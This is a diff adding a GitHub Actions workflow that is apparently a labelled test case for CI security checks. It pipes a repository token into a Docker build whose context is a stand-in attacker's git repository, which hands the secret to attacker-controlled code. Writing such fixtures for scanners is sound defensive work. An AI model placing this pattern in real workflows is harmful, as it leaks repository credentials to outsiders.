@@ -1,0 +1,14 @@
+# D10 (wk-09b-i2): the pinned build action, token in its env, building a remote git context.
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build and push
+        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc
+        with:
+          context: https://github.com/attacker/x.git
+          secret-envs: |
+            node_auth_token=NODE_AUTH_TOKEN
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}
